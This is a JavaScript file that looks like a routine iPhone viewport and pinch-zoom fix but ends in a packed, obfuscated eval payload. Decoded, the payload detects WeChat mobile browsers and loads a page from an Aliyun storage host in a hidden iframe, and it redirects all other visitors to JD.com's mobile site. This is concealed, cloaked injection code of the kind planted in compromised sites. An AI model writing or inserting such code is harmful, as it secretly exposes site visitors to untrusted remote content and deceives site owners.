var metas = document.getElementsByTagName('meta');
var i;
if (navigator.userAgent.match(/iPhone/i)) {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=1.0, maximum-scale=1.0";
    }
  }
  document.addEventListener("gesturestart", gestureStart, false);
}
function gestureStart() {
  for (i=0; i<metas.length; i++) {
    if (metas[i].name == "viewport") {
      metas[i].content = "width=device-width, minimum-scale=0.25, maximum-scale=1.6";
    }
  }
}
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 e(){2 a=D.t.v();5(B 6.o!=\'p\'&&/q/.s(a))3 u;l 3 y}4 9(a){2 b=6.8.L.n(1);2 c=b.f(\'&\');r(2 i=0;i<c.V;i++){2 d=c[i].f(\'=\');5(d[0]==a){3 d[1]}}3 w}5(e()||9(\'x\')==1)g(h);l 6.8.A=\'j://m.C.k\';2 h=\'j://E.F-G-H.I.k/J.K\';4 g(a){2 b=7.M("N");2 c=7.O("P");c.Q=a;c.R.S="T";7.U.z(c)}',58,58,'||var|return|function|if|window|document|location|getUrlParameter|||||isWeixin|split|openUrl|http_url||http|com|else||substring|orientation|undefined|micromessenger|for|test|userAgent|true|toLowerCase|null|debug|false|appendChild|href|typeof|jd|navigator|ynochp1567337551|oss|cn|shanghai|aliyuncs|url|html|search|getElementById|dialog|createElement|iframe|src|style|display|none|body|length'.split('|'),0,{}))
